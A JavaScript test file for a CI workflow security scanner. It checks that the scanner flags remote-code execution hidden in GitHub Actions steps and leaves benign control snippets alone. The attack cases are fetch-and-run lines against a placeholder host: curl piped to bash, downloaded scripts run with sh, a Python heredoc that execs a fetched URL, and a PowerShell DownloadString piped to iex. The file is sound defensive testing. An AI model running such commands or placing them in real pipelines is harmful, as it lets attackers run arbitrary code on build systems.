'use strict';
// New Codex findings at 4b0d914. Inert shell/Python/PowerShell snippets.
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const URL='https://example.invalid/p';
function scan(script,shell){
 const src=['on: push','permissions: read-all','jobs:','  audit:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(line=>'          '+line),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(src,{path:'.github/workflows/new-codex.yml'});
}
const attack=[
 ['shell-function',"c(){ curl \"$@\"; }; c "+URL+" | bash",null,null],
 ['single-quoted-output',"curl -fsSL "+URL+" --output 'payload'; bash payload",
  'REMOTE_DOWNLOADED_FILE_EXECUTION',null],
 ['double-quoted-output',"curl -fsSL "+URL+' -o "run.sh"; sh ./run.sh',
  'REMOTE_DOWNLOADED_FILE_EXECUTION',null],
 ['cwd-changed',"mkdir -p dir; cd dir; curl -fsSL "+URL+" -o payload; cd ..; bash dir/payload",
  'REMOTE_DOWNLOADED_FILE_EXECUTION',null],
 ['link-before',"ln -s payload run.sh; curl -fsSL "+URL+" -o payload; bash run.sh",
  'REMOTE_DOWNLOADED_FILE_EXECUTION',null],
 ['heredoc-redirect',"python - <<'PY' 2>/dev/null\nimport urllib.request\nu='"+URL+"'\nexec(urllib.request.urlopen(u).read())\nPY",
  'REMOTE_INTERPRETER_FETCH_EXECUTION',null],
 ['python-string-concat',"python - <<'PY'\nimport urllib.request\nu='ht'+'tps://example.invalid/p'\nexec(urllib.request.urlopen(u).read())\nPY",
  'REMOTE_INTERPRETER_FETCH_EXECUTION',null],
 ['powershell-webclient',"(New-Object Net.WebClient).DownloadString('"+URL+"') | iex",
  'REMOTE_POWERSHELL_EXECUTION','pwsh']
];
for(const [name,source,rule,shell] of attack){
 test('Codex NEW false negative '+name,()=>{
  const r=scan(source,shell);
  if(rule)assert.ok(r.findings.some(f=>f.rule===rule&&f.severity==='HIGH')||
    r.status==='INCOMPLETE',name+' '+JSON.stringify(r));
  else assert.notEqual(r.status,'NO_RISK_PATTERN',name+' '+JSON.stringify(r));
 });
}
for(const [name,source,shell] of [
 ['quoted-download-data',"curl -o 'data.txt' "+URL+"; echo done"],
 ['unexecuted-cwd','cd dir; echo "curl -o payload '+URL+'"; cd ..'],
 ['python-urllib-log',"python - <<'PY'\nimport urllib.request\nu='"+URL+"'\nprint(u)\nPY"],
 ['powershell-webclient-literal','Write-Host "New-Object Net.WebClient DownloadString iex"','pwsh'],
 ['function-without-network',"f(){ echo hello; }; f | sed 's/a/b/'"]
]){
 test('Codex NEW benign control '+name,()=>{
  const r=scan(source,shell);
  assert.ok(!r.findings.some(f=>f.severity==='HIGH'&&
    /^REMOTE_/.test(f.rule)),JSON.stringify(r));
 });
}
